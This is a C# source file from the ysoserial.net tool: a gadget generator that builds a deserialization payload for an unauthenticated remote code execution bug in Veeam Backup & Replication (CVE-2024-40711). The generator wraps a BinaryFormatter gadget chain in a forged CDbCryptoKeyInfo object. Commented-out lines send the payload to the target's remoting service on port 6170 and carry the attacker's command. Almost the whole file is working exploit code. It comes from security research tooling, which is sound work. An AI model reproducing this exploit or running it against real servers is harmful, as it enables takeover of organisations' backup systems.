using NDesk.Options;
using Newtonsoft.Json.Linq;
using Polenter.Serialization.Core;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
//using Veeam.Backup.Core;
//using Veeam.Backup.Model;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    public class VeeamCDbCryptoKeyInfoGenerator : GenericGenerator
    {
        string _veeamBackupModelVer = "12.1.0.0";
        string _veeamBackupModelPubKeyToken = "bfd684de2276783a";
        public override string Finders()
        {
            return "friday the 13th";
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.BridgeAndDerived };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {

            string banner = @"


                 __         .__  ___________                    
__  _  _______ _/  |_  ____ |  |_\__    ___/_____  _  _________ 
\ \/ \/ /\__  \\   __\/ ___\|  |  \|    | /  _ \ \/ \/ /\_  __ \
 \     /  / __ \|  | \  \___|   Y  \    |(  <_> )     /  |  | \/
  \/\_/  (____  /__|  \___  >___|  /____| \____/ \/\_/   |__|   
              \/          \/     \/                             
";

            string banner2 = @"
        (*) Veeam Backup & Replication Unauthenticated Remote Code Execution Exploit (CVE-2024-40711)
          - Vulnerability Discovered by Florian Hauser (@frycos) at CODE WHITE Gmbh (@codewhitesec)
          - Exploit Written by Sina Kheirkhah (@SinSinology) at watchTowr
          - Thank you to my dear friend Soroush Dalili (@irsdl) for his help

        CVEs: [CVE-2024-40711]  
";
            //Console.Error.WriteLine(banner);
            //Console.Error.WriteLine(banner2);
            //Console.WriteLine(banner);
            //Console.WriteLine(banner2);

            //string tool_path_ExploitRemoting = @".\ExploitRemotingService\ExploitRemotingService.exe";

            //string tool_path_RogueRemoting = @".\RogueRemotingServer\RogueRemotingServer.exe";


            //string rogueremoting_payload_filename = @"exploit.soapformatter";

            //if (!File.Exists(tool_path_ExploitRemoting))
            //{

            //    Console.WriteLine($"[!] Following tool needs to be present {tool_path_ExploitRemoting}");
            //    System.Environment.Exit(1);
            //}
            //if (!File.Exists(tool_path_RogueRemoting))
            //{
            //    Console.WriteLine($"[!] Following tool needs to be present {tool_path_RogueRemoting}");

            //    System.Environment.Exit(1);
            //}
            //if (!File.Exists(rogueremoting_payload_filename))
            //{
            //    Console.WriteLine($"[!] required payload is not present");

            //    System.Environment.Exit(1);
            //}

            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            } else
            {
                binaryFormatterPayload = (byte[]) new ObjRefGenerator().Generate(formatter, inputArgs);
            }

            CDbCryptoKeyInfoWrapper payload = new CDbCryptoKeyInfoWrapper(new string[] { Convert.ToBase64String(binaryFormatterPayload) });
            payload.Ver = _veeamBackupModelVer;
            payload.Token = _veeamBackupModelPubKeyToken;

            //ProcessStartInfo rogueRemoting = new ProcessStartInfo
            //{
            //    FileName = tool_path_RogueRemoting,
            //    Arguments = @"--wrapSoapPayload " + inputArgs.Cmd + " " + rogueremoting_payload_filename,
            //    UseShellExecute = false,
            //    CreateNoWindow = false
            //};
            //Process.Start(rogueRemoting);


            //        ProcessStartInfo exploitRemoting = new ProcessStartInfo
            //        {
            //            FileName = tool_path_ExploitRemoting,

            //// I know
            //Arguments = @"-s tcp://" + inputArgs.TargetVeeamIP + @":6170/PermanentSessionService raw " + Convert.ToBase64String((byte[])Serialize(payload, formatter, inputArgs)),

            //            UseShellExecute = false,
            //            RedirectStandardOutput = true,
            //            RedirectStandardError = true,
            //            CreateNoWindow = true
            //        };


            //        Process.Start(exploitRemoting);

            //System.Environment.Exit(1); 

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
            {
                var ret = (byte[])Serialize(payload, formatter, inputArgs);
                return ret;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }


        }

        public override string Name()
        {
            return "VeeamCDbCryptoKeyInfo";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "SoapFormatter", "ObjectStateFormatter", "LosFormatter" };
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                { "VeeamBackupModelVer=", "Version of Veeam.Backup.Model assembly", v => _veeamBackupModelVer = v },
                { "VeeamBackupModelPubKeyToken=", "PublicKeyToken of Veeam.Backup.Model assembly", v => _veeamBackupModelPubKeyToken = v },
            };
            return options;
        }

        [Serializable]
        public class CDbCryptoKeyInfoWrapper : ISerializable
        {
            private string[] _fakeList;

            public string Ver {  get; set; }
            public string Token {  get; set; }

            public CDbCryptoKeyInfoWrapper(string[] _fakeList)
            {
                this._fakeList = _fakeList;
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                //info.SetType(typeof(CDbCryptoKeyInfo));
                info.AssemblyName = "Veeam.Backup.Model, Version=" + Ver + ", Culture=neutral, PublicKeyToken=" + Token;
                info.FullTypeName = "Veeam.Backup.Model.CDbCryptoKeyInfo";
                info.AddValue("Id", Guid.NewGuid());
                info.AddValue("KeySetId", null);
                info.AddValue("KeyType", 1);
                info.AddValue("Hint", "aaaaa");
                info.AddValue("DecryptedKeyValue", "AAAA");
                info.AddValue("LocaleLCID", 0x409);
                info.AddValue("ModificationDateUtc", new DateTime());
                info.AddValue("CryptoAlg", 1);
                info.AddValue("RepairRecs", _fakeList);
            }
        }


    }
}
